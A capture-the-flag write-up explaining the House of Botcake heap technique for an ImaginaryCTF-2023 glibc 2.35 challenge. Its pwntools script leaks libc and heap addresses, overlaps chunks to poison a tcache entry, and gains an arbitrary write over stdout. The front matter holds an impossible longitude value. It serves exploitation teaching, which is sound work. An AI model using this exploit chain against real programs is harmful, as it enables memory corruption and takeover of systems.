---
title: "House of Botcake — Achieving Arbitrary Write via Tcache Overlap"
ctf: "ImaginaryCTF-2023"
category: "pwn"
difficulty: "easy"
points: null
date: "2026-06-16"
lat: -10.71
lng: 1500
summary: "Consolidating unsorted bin chunks to overlap a tcache chunk, allowing modification of the tcache entry to target stdout for an arbitrary write."
tags:
  - "heap"
  - "unsortedbin"
  - "house-of-botcake"
  - "tcache-poisoning"
  - "double-free"
  - "glibc-2.35"
---

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r



count = -1
def write(idx,size,data):
    global count
    r.sendlineafter(b"> ",b"1")
    r.sendlineafter(b"idx: ",str(idx).encode())
    r.sendlineafter(b"size: ",str(size).encode())
    r.sendlineafter(b"content: ",data)
    count+=1
    return count

def read(idx):
    r.sendlineafter(b"> ",b"3")
    r.sendlineafter(b"idx: ",str(idx).encode())
    return r.recvline()

def free(idx):
    r.sendlineafter(b"> ",b"2")
    r.sendlineafter(b"idx: ",str(idx).encode())

def main():
    global r
    r = conn()
```

 Okay, in this challenge, we will learn how to get an arbitrary write via a double-free and use-after-free. It seems to be easy, so let's start. 
 First, we need to leak both libc and the heap base. We already know how to do that since we can read after freeing a chunk. 

 This allows us to get the heap base and put free chunks into the unsorted bin to read them as well.
 So, let's fill the tcache and get two chunks into the unsorted bin too.

```python
    entry_21 = []

    for i in range(7):
        entry_21.append(write(i,0x200,b""))

    chunkA = write(7,0x200,b"")
    chunkB = write(8,0x200,b"")
    guard  = write(9,0x18 ,b"Guard" )

    for i in entry_21:
        free(i)

    for i in range(5):
        write(1,0x100,b"")

    free(chunkB)
    free(chunkA)
```

Now let's get the leak. We can use entry 21 for the heap leak. For the libc leak, we can use chunk A or B. Just make sure to clean the unsorted bin first.

```python
    lib = u64(read(chunkB).strip().ljust(8,b"\x00")) - 0x219ce0
    heap = u64(read(entry_21[0]).strip().ljust(8,b"\x00")) << 12

    log.success(f"LEAK:\nlibc:{hex(lib)}\nheap:{hex(heap)}\n")
    libc.address = lib
```

Now that we have both leaks, we can make entry 21 point to stdin, stdout, or any address we want. The next time malloc is called for this size, it will return that address and give us an arbitrary write.

However, we first need an overflow to change the fd pointer of the chunks in the unsorted bin. Since there is no overflow vulnerability here, we will use a technique known as the House of Botcake. Basically, when we free chunk B and chunk A, they consolidate into one big chunk of size 0x410. This helps us overlap the chunks, modify the fd pointer, and change it to whatever we need. 

You might wonder: do we need to bypass Safe Linking? Since we are dealing with the unsorted bin, Safe Linking does not apply directly. The magic of this technique is that our fake chunk will be in the unsorted bin and the tcache at the same time. This is the core concept of the attack, so let's do it!

```python
    chunkC = write(10,0x200,b"")
```
Okay, I get it. The idea is to allocate a chunk of size 0x200 from the bins using malloc. Now, the next free chunk of this same size will act like a tcache chunk. Whatever it was in the past—like chunk B—if we free it, it will go into the tcache bins. 

The tcache count becomes 6 after we allocate chunk C. When we free chunk B, the count goes back up to 7, and the top entry of this tcache bin becomes the address of chunk B. 

As we discussed, we can overlap this address using the 0x410 chunk from chunk A. By changing this address, we can overwrite the tcache entry indirectly. The next malloc call for this size will then pop our target address and grant us our arbitrary write.

```python
    free(chunkB)

    stdout = libc.symbols['_IO_2_1_stdout_']
    target = b"\x00"*0x208 + p64(0x211) + p64(((heap>>12)+1) ^ stdout)

    write(chunkA,0x410,target)
```
After doing this, we can see that the tcache bins are corrupted. Our stdout chunk will be returned after the second malloc call, which works because we used a double-free. After the first malloc call of this size, the next available target becomes:

0x72b82881a780 <_IO_2_1_stdout_>

This is exactly what will be returned to us on the following allocation.

```python
    write(11,0x200,b"")

    payload = p64(0xfbad1900)
    write(12,0x200,payload)
```
Finally, we gain access to stdout, allowing us to overwrite the entire structure.
 From here, we can use another "House of" technique to achieve arbitrary code execution. I will cover that process in the next post, since the House of Botcake's main goal is simply to grant the arbitrary write that we achieved here.
```python
    r.interactive()

if __name__ == "__main__":
    main()
```